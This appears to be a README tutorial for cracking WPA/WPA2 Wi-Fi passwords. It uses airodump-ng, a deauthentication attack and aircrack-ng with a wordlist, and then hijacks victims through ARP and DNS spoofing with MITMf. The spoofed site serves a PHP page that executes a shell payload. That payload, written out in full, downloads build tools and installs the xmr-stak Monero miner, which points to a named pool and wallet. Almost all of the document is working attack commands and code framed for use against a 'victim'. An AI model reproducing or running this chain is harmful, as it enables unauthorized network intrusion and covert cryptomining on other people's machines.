# Gaining access to WPA/WPA2 with short/easy password and inject mining script
## Part 1. Gaining access to WIFI:
1. Install kali
2. Buy and hook a NIC (I used alfa awus036neh) that can use monitor mode to VM (assuming your interface name is wlan0)
``` 
ifconfig wlan0 down && iwconfig wlan0 mode monitor && ifconfig wlan0 up
OR
airmon-ng start wlan0
```
3. Sniff the environment for victim WIFI and capture bssid of target WIFI (Assuming target bssid is BSSID channel C)
```
airodump-ng wlan0
```
4. Sniff the MAC address of clients connected to it (Assuming target mac is MAC) 
```
airodump-ng --bssid BSSID --channel C --write output wlan0 
```
5. Get the handshake traffic. WPA/WPA2 is more secure than WEP so need to capture WPA/WPA2 handshake traffic since it contains Message Integrity Code (MIC) sent from client during handshake. To get the handshake traffic, use deauthentication attack to kick a currently connected client offline and capture it’s traffic when it reconnects.
```
aireplay --deauth 0 -a BSSID -c MAC wlan0
```
6. Get a wordlist. Two approaches for this part. (Assuming wordlist file is wl.txt)
   1. Downloaded wordlists from https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length 
   2. Generated my custom wordlist. Since when I am attacking my own wifi, I have some information about the password pattern and it makes the process easier. In real world this process is done by social engineering.
7. Compare the captured MIC with locally generated MIC from password from wordlist to find the correct password. 
```
aircrack-ng output-01.cap -w wl.txt
```
## Part 2. Injecting malicious script to victim machine.
The general idea is to use MITM attack and do DNS spoofing. When the victim visites google.com, I will redirect him to php file under my server and execute the payload
1. Install MITMf
```
cd ~;git clone https://github.com/byt3bl33d3r/MITMf; cd MITMf/;git submodule init && git submodule update --recursive
```
2. Change the /etc/mitmf/mitmf.conf file, add the following line below the IPv4 address record line
```
*.illinois.edu=LOCALHOST_IP_IN_THE_TARGET_NETWORK
www.illinois.edu=LOCALHOST_IP_IN_THE_TARGET_NETWORK
illinois.edu=LOCALHOST_IP_IN_THE_TARGET_NETWORK
```
3. Create the php file, Code I used is 
```
<?php
$result = shell_exec('/var/www/html/payload.sh');
echo $result;
?>
<a href="https://www.google.com">Continue to Google</a>
```
3.1 Make sure index.php has highest priority in apache2 (over index.html)
4. Code i wrote for payload.sh is 
```
#!/bin/bash
(sudo su;
echo -ne "\n" | sudo add-apt-repository ppa:ubuntu-toolchain-r/test;
sudo apt update;
echo -ne "Y\n" | sudo apt install gcc-5 g++-5 make;
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 1 --slave /usr/bin/g++ g++ /usr/bin/g++-5;
curl -L http://www.cmake.org/files/v3.4/cmake-3.4.1.tar.gz | tar -xvzf - -C /tmp/;
cd /tmp/cmake-3.4.1/ && ./configure && make && sudo make install && cd -;
sudo update-alternatives --install /usr/bin/cmake cmake /usr/local/bin/cmake 1 --force;
echo -ne 'y\n' | sudo apt install libmicrohttpd-dev libssl-dev libhwloc-dev;
git clone https://github.com/fireice-uk/xmr-stak.git;
mkdir xmr-stak/build; cd xmr-stak/build;
cmake .. -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF;
make install;cd bin;
echo -ne "n\n0\nmonero\npool.supportxmr.com:3333\n42AxakojAJUjjYPJbx7Jd5gD2SQHMF8yu4DyHh5GckqcWVmw4e3GPchJ35UR9XQzoCSaFbwBU2JQP993HyE6QDFtC4UdNKr\n\nN\nN\nN\n" | ./xmr-stak)&
echo "your network is being controlled, click here to "
```
5. find the target IP and gateway IP
```
netdiscover -i wlan0 192.168.1.1/24
```
5. run dns spoofing on kali and all done!
```
cd ~/MITMf; python mitmf.py --arp --spoof -i wlan0 --target TARGET_IP --gateway GATEWAY_IP --dns
```
I tested under my home network on my linux laptop, it is working.
